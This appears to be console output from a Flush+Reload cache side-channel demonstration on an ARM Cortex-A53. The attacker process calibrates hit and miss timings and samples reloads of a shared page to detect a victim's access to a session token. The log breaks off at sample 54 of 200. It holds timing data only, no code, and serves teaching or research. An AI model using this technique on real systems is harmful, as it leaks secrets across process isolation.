╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffff81b59000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    161 ns  (line already in cache)
[attacker]   DRAM miss     =   2331 ns  (line not in cache)
[attacker]   Threshold     =   1246 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       1406        miss      0 hits so far  (warmup)
  2       2135        miss      0 hits so far  (warmup)
  3       1614        miss      0 hits so far  (warmup)
  4       1250        miss      0 hits so far  (warmup)
  5       2239        miss      0 hits so far  (warmup)
  6       1875        miss      0 hits so far  (warmup)
  7       2864        miss      0 hits so far  (warmup)
  8       1458        miss      0 hits so far  (warmup)
  9       1666        miss      0 hits so far  (warmup)
  10      2291        miss      0 hits so far  (warmup)
  11      2395        miss      0 hits so far
  12      1927        miss      0 hits so far
  13      1302        miss      0 hits so far
  14      1562        miss      0 hits so far
  15      1145        HIT ◄   1 hits so far
  16      2916        miss      1 hits so far
  17      1614        miss      1 hits so far
  18      7812        miss      1 hits so far
  19      1354        miss      1 hits so far
  20      7343        miss      1 hits so far
  21      1250        miss      1 hits so far
  22      1614        miss      1 hits so far
  23      729         HIT ◄   2 hits so far
  24      2604        miss      2 hits so far
  25      1718        miss      2 hits so far
  26      1510        miss      2 hits so far
  27      2760        miss      2 hits so far
  28      2656        miss      2 hits so far
  29      2291        miss      2 hits so far
  30      1197        HIT ◄   3 hits so far
  31      937         HIT ◄   4 hits so far
  32      2343        miss      4 hits so far
  33      1510        miss      4 hits so far
  34      1562        miss      4 hits so far
  35      1562        miss      4 hits so far
  36      1822        miss      4 hits so far
  37      2031        miss      4 hits so far
  38      1666        miss      4 hits so far
  39      1197        HIT ◄   5 hits so far
  40      2187        miss      5 hits so far
  41      2500        miss      5 hits so far
  42      1250        miss      5 hits so far
  43      1406        miss      5 hits so far
  44      1406        miss      5 hits so far
  45      1302        miss      5 hits so far
  46      1302        miss      5 hits so far
  47      1458        miss      5 hits so far
  48      3125        miss      5 hits so far
  49      1822        miss      5 hits so far
  50      1302        miss      5 hits so far
  51      1822        miss      5 hits so far
  52      2812        miss      5 hits so far
  53      1354        miss      5 hits so far
  54      1250        miss      5 hits so far
